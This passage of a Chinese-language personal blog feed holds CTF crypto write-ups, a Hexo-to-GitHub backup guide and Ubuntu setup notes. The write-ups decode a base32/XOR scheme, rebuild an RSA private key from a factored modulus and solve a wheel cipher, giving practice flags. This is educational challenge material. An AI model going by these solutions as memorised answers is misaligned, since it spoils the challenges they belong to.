class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">print(<span class="string">'Please Input your flag:'</span>)</span><br><span class="line">flag = input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    print(<span class="string">'correct'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'wrong'</span>)</span><br></pre></td></tr></table></figure><p>emmm,然后就好办了,加密方法都在上面了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==="</span></span><br><span class="line">s1=base64.b32decode(s)</span><br><span class="line">print(s1)</span><br><span class="line"></span><br><span class="line">s2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">    x=i^<span class="number">36</span></span><br><span class="line">    x-=<span class="number">36</span></span><br><span class="line">    s2+=chr(x)</span><br><span class="line">print(s2)</span><br><span class="line"></span><br><span class="line">s3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">    x=ord(i)<span class="number">-25</span></span><br><span class="line">    x=x^<span class="number">36</span></span><br><span class="line">    s3+=chr(x)</span><br><span class="line">print(s3)</span><br></pre></td></tr></table></figure><h2 id="7-Normal-RSA"><a href="#7-Normal-RSA" class="headerlink" title="7. Normal_RSA"></a>7. Normal_RSA</h2><p>打开附件,里面是<code>pubkey.pem</code>和<code>flag.enc</code></p><p>我们可以利用kali里的openssl来搞</p><ol><li><p>把文件拖虚拟机里</p></li><li><p>终端输入openssl</p></li><li><p><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></p><ul><li>exponent:E</li><li>modulus:N</li></ul><p>以上两个要用,复制好</p></li><li><p>上网找在线分解质因数的搞出P,Q</p></li><li><p>然后在kali中使用(代码如下,pqe自填),会生成一个private.pem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li><li><p>在终端中打开openssl,输入<code>rsautl -decrypt -in flag.enc -inkey private.pem</code></p></li><li><p>ojbk</p></li></ol><h2 id="8-转轮机加密"><a href="#8-转轮机加密" class="headerlink" title="8. 转轮机加密"></a>8. 转轮机加密</h2><p>题目:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"><span class="number">2</span>:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"><span class="number">3</span>:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"><span class="number">4</span>:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"><span class="number">5</span>:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"><span class="number">6</span>:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"><span class="number">7</span>:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"><span class="number">8</span>:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"><span class="number">9</span>:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"><span class="number">10</span>: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"><span class="number">11</span>： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line"><span class="number">12</span>： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line"><span class="number">13</span>： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span></span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>大概就像旧式电话一样</p><p>对应着电话号码(2,3,7,5,13,12,9,1,8,10,4,11,6)</p><p>把对应轮数中的对应字符(N F Q K S E V O Q O F N P)</p><p>拨到第一个去(看下图第一列,与密文相同)</p><p><img src="image-20200404230355691.png" alt="image-20200404230355691"></p><p>然后竖着看,直到找到有实际意义的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circle</span><span class="params">(string,char)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> string[<span class="number">0</span>]!=char:</span><br><span class="line">        string=string[<span class="number">1</span>:]+string[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">s=<span class="string">"""ZWAXJGDLUBVIQHKYPNTCRMOSFE </span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI </span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK </span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO </span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY </span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET </span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ </span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ </span></span><br><span class="line"><span class="string">XPLTDSRFHENYVUBMCQWAOIKZGJ </span></span><br><span class="line"><span class="string">UDNAJFBOWTGVRSCZQKELMXYIHP </span></span><br><span class="line"><span class="string">MNBVCXZQWERTPOIUYALSKDJFHG </span></span><br><span class="line"><span class="string">LVNCMXZPQOWEIURYTASBKJDFHG </span></span><br><span class="line"><span class="string">JZQAWSXCDERFVBGTYHNUMKILOP"""</span></span><br><span class="line">s=s.replace(<span class="string">" \n"</span>,<span class="string">" "</span>)</span><br><span class="line">lst=s.split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">key=<span class="string">"2,3,7,5,13,12,9,1,8,10,4,11,6"</span></span><br><span class="line">key=key.split(<span class="string">","</span>)</span><br><span class="line">key=[int(i)<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">x=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">end=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    tempstr=lst[key[i]]</span><br><span class="line">    word=x[i]</span><br><span class="line">    end.append(circle(tempstr,word))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        print(end[j][i].lower(),end=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nfqksevoqofnp</span><br><span class="line">ahgcxiusnwcbn</span><br><span class="line">ctwpcubfotuvy</span><br><span class="line">zetmdrmezgkcc</span><br><span class="line">dqhneyczuvtxj</span><br><span class="line">tgszrtqwtrezb</span><br><span class="line">rypqfawawsbqf</span><br><span class="line">xxywvsaxdcswz</span><br><span class="line">mpbxbbojczxed</span><br><span class="line"><span class="keyword">jlxygkigvqqrr</span></span><br><span class="line"><span class="keyword">qoiitjkdrkytu</span></span><br><span class="line"><span class="keyword">oczhydzljeips</span></span><br><span class="line"><span class="keyword">ykufhfgullzol</span></span><br><span class="line"><span class="keyword">hblrnhjbxmmio</span></span><br><span class="line"><span class="keyword">gdvlugxvkxjuq</span></span><br><span class="line"><span class="keyword">vmkamlpiiywyx</span></span><br><span class="line"><span class="keyword">sambkvlqsiaav</span></span><br><span class="line"><span class="keyword">fireinthehole</span></span><br><span class="line"><span class="keyword">uzaulcdkfprst</span></span><br><span class="line"><span class="keyword">wvfoomsyaupka</span></span><br><span class="line"><span class="keyword">irdtpxrppdldm</span></span><br><span class="line"><span class="keyword">kncsjzfnmnnjk</span></span><br><span class="line"><span class="keyword">psegzphtyadfg</span></span><br><span class="line"><span class="keyword">bjojqqecgjvhh</span></span><br><span class="line"><span class="keyword">eunvaonrhfhgi</span></span><br><span class="line"><span class="keyword">lwjdwwymbbgmw</span></span><br></pre></td></tr></table></figure><p>发现就<strong>fireinthehole</strong>是个可读的字符串</p><h2 id="9-easy-ECC"><a href="#9-easy-ECC" class="headerlink" title="9. easy_ECC"></a>9. easy_ECC</h2><p>是的,我不会</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;攻防世界-crypto-新手练习区&quot;&gt;&lt;a href=&quot;#攻防世界-crypto-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;攻防世界-crypto-新手练习区&quot;&gt;&lt;/a&gt;攻防世界-crypto-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;1-bas
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="密码" scheme="https://mercer5.github.io/tags/%E5%AF%86%E7%A0%81/"/>
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>blog备份</title>
    <link href="https://mercer5.github.io/2020/04/04/blog%E5%A4%87%E4%BB%BD/"/>
    <id>https://mercer5.github.io/2020/04/04/blog%E5%A4%87%E4%BB%BD/</id>
    <published>2020-04-04T07:59:06.000Z</published>
    <updated>2020-08-24T15:30:09.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="备份blog"><a href="#备份blog" class="headerlink" title="备份blog"></a>备份blog</h1><hr><p>由于<code>hexo d</code>上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件。</p><p>也就是上传的是在本地目录里自动生成的<code>.deploy_git</code>里面。</p><p>其他文件 ，包括我们写在source 里面的，和配置文件，主题文件，都没有上传到github</p><p>由于最近电脑经常出问题,感觉还是乘早把东西都备份一下的好</p><hr><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><ol><li><p>在github中,作为blog的仓库新建一个分支</p><p>我建了一个hexo</p><p><img src="Snipaste_2020-04-04_15-36-20.png" alt="Snipaste_2020-04-04_15-36-20"></p></li><li><p>把新建的分支设为默认分支</p><p>这样的话,clone下来的,还有push上去的都只会在hexo分支中进行</p><p>而最开始的master分支,就会只用来存储静态网页</p><p><code>setting</code>–&gt;<code>branckes</code>–&gt;<code>hexo</code>–&gt;<code>update</code></p><p><img src="Snipaste_2020-04-04_15-40-38.png" alt="Snipaste_2020-04-04_15-40-38"></p></li></ol><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><ol><li><p>在你喜欢的地方新建一个文件夹</p></li><li><p>打开git bash ,clone一下文件</p><p><img src="Snipaste_2020-04-04_15-44-21.png" alt="Snipaste_2020-04-04_15-44-21"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">&lt;url</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>把clone到本地的文件删到只剩下<strong>.git</strong>文件夹</p><p><img src="Snipaste_2020-04-04_15-46-08.png" alt="Snipaste_2020-04-04_15-46-08"></p></li><li><p>把之前我们写的博客源文件全部复制过来，除了<code>.deploy_git</code>。这里应该说一句，复制过来的源文件应该有一个<code>.gitignore</code>，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这些类型文件不需要git：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.DS_Store</span></span><br><span class="line">Thumbs<span class="number">.</span><span class="built_in">db</span></span><br><span class="line"><span class="built_in">db</span><span class="number">.</span>json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line"><span class="meta">public</span>/</span><br><span class="line"><span class="meta">.deploy</span>*/</span><br></pre></td></tr></table></figure></li><li><p>看看theme/next 下面有没有<strong>.git</strong>文件夹,如果有,把删掉</p><p>因为git不能嵌套上传</p></li><li><p>文件夹中大概像图片那样就行了(aaaa,那个<code>.deploy_git</code>是之后生成的,忽略掉就好)</p><p><img src="Snipaste_2020-04-04_15-48-19.png" alt="Snipaste_2020-04-04_15-48-19"></p></li></ol><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit –m <span class="string">"backup"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure><p>然后去github康康,hexo分支应该就变成你文件夹中应该有的东西了</p><p><img src="Snipaste_2020-04-04_15-57-48.png" alt="Snipaste_2020-04-04_15-57-48"></p><p>而master分支没有变化</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>确保<code>hexo deploy</code>推送的是master分支，hexo目录下的_config.yml文件通常会配置deploy推送的目标地址，这个一般在最初使用hexo时，就会配置为master，不用改动：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/sherlockyb/sherlockyb.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>之后就可以在文件夹中快乐的使用了</p><h3 id="生成网页"><a href="#生成网页" class="headerlink" title="生成网页"></a>生成网页</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit -m <span class="string">"description"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;备份blog&quot;&gt;&lt;a href=&quot;#备份blog&quot; class=&quot;headerlink&quot; title=&quot;备份blog&quot;&gt;&lt;/a&gt;备份blog&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;由于&lt;code&gt;hexo d&lt;/code&gt;上传部署到github的其实是hexo编译后的文件，是用
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>从零开始ubuntu</title>
    <link href="https://mercer5.github.io/2020/04/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bubuntu/"/>
    <id>https://mercer5.github.io/2020/04/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bubuntu/</id>
    <published>2020-04-04T07:21:02.000Z</published>
    <updated>2020-08-24T15:30:09.810Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从零开始ubuntu-18-04"><a href="#从零开始ubuntu-18-04" class="headerlink" title="从零开始ubuntu 18.04"></a>从零开始ubuntu 18.04</h1><hr><ol><li><p>投入kali怀抱好久了,突然想搞ubuntu</p><p>一个搞人,一个搞编程,分工明确,嗯</p><p>想想搞kali时的艰难经过,想必这次也不会例外</p><p>所以记录一下使用ubuntu的曲折历程</p></li><li><p>要是我的提供不了帮助,建议拉到最下面,点击链接看原博客</p><p>每个人情况不一样,我只记录并解决了我所遇到的问题</p><p>看着参考越来越多,相当于一个小型资料库了都: (</p></li><li><p>记录一下时间,要是时间过去很久了,参考价值就小了</p><p>2020-04-03(最近更新时间)</p></li></ol><hr><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p>附上清华源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 默认注释了源码镜像以提高 apt <span class="keyword">update</span> 速度，如有需要可自行取消注释</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> vim</span><br></pre></td></tr></table></figure><p>一些简单的操作</p><ol><li><p>vim name.txt(打开或创建编辑器)</p></li><li><p>“i”插入模式(只有进入插入模式才可以更改内容)    (^u,好用的删行小技巧)</p></li><li><p>“esc”退出插入模式</p></li><li><p>“:”,wq(写入并保存)</p><p>(A：在最后输入命令时，直接输入”x”，也是一样的，即X=WQ。</p><p>B：最快捷的方法：按了ESC后，直接按shift+zz，或者切换到大写模式按ZZ，就可以保存退出了，即是按2下大写的Z)</p></li></ol><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install python-pip</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install python3-pip</span><br></pre></td></tr></table></figure><p>升级</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure><p>卸载</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> <span class="builtin-name">remove</span> python3-pip</span><br></pre></td></tr></table></figure><h2 id="vm-tools"><a href="#vm-tools" class="headerlink" title="vm-tools"></a>vm-tools</h2><p>电脑里的文件拖不进虚拟机,复制的也粘贴不了</p><p>输入命令行全手打,我天</p><p>不过这个不是ubuntu的锅,是vm的</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> autoremove <span class="keyword">open</span>-<span class="keyword">vm</span>-tools</span><br><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools</span><br><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools-desktop</span><br></pre></td></tr></table></figure><h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><p>安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install gcc</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p>使用</p><p>​    强烈推荐: <a href="http://c.biancheng.net/view/660.html" target="_blank" rel="noopener">http://c.biancheng.net/view/660.html</a></p><p>​    照着做就会了(为什么有种推销员的感觉???)</p><h2 id="好玩的终端命令"><a href="#好玩的终端命令" class="headerlink" title="好玩的终端命令"></a>好玩的终端命令</h2><p><strong>小火车</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sl</span><br><span class="line">sl</span><br></pre></td></tr></table></figure><p><strong>cmatrix代码雨</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cmatrix</span><br><span class="line">cmatrix</span><br></pre></td></tr></table></figure><p><strong>终端火焰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libaa-bin</span><br><span class="line">aafire</span><br></pre></td></tr></table></figure><h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p><strong>安装Fcitx输入框架</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> fcitx</span><br></pre></td></tr></table></figure><p><strong>安装</strong></p><p>上搜狗输入法官网下载Linux版本搜狗输入法（32位和64位根据自己情况，在虚拟机上用浏览器下载</p><p>点击安装包</p><p><strong>设置</strong></p><p><img src="Snipaste_2020-04-02_09-31-10.png" alt="Snipaste_2020-04-02_09-31-10"></p><p>根据红色箭头进入语言安装界面，安装语言（会自动安装中文语言）</p><p><img src="Snipaste_2020-04-02_09-31-18.png" alt="Snipaste_2020-04-02_09-31-18"></p><p>根据下方箭头更爱输入框架为fcitx，然后点击上面的Apply System-Wide应用到全局。然后将当前用户进行注销后再进行登录（注销没有效果，重启就可以了）。</p><p>登陆后在右上角出现一个键盘标志，点击进入，选择Configure Current Input Method</p><p><img src="Snipaste_2020-04-02_09-31-25.png" alt="Snipaste_2020-04-02_09-31-25"></p><p>进入下面的Input Method界面后，选择+号</p><p><img src="Snipaste_2020-04-02_09-31-31.png" alt="Snipaste_2020-04-02_09-31-31"></p><p>进入到Add input method界面，将下面的Only Show Current Language 点掉后，在搜索栏搜索搜狗拼音，选中之后进行添加。</p><p><img src="Snipaste_2020-04-02_09-31-37.png" alt="Snipaste_2020-04-02_09-31-37"></p><p>添加成功后，将搜狗拼音移到第一位。</p><p>成功之后，打开浏览器随便输入，可以看到输入结果，同时成功后下方还会出现搜狗输入法的标志，这时候就可以通过shirt键切换中英文。</p><p><strong>其他</strong></p><p>不习惯默认中文的小伙伴可以,把sogou放在第二个</p><h2 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h2><p><strong>安装</strong></p><ol><li><p>首先，更新包的索引和安装的依赖键入:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> apt update</span><br><span class="line"><span class="title">sudo</span> apt install software-properties-common apt-trans<span class="keyword">port</span>-https wget</span><br></pre></td></tr></table></figure></li><li><p>接下来，使用以下[wget命令]导入Microsoft GPG密钥</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q http<span class="variable">s:</span>//packages.microsoft.<span class="keyword">com</span>/<span class="built_in">keys</span>/microsoft.asc -O- | sudo apt-key <span class="built_in">add</span> -</span><br></pre></td></tr></table></figure><p>并使Visual Studio 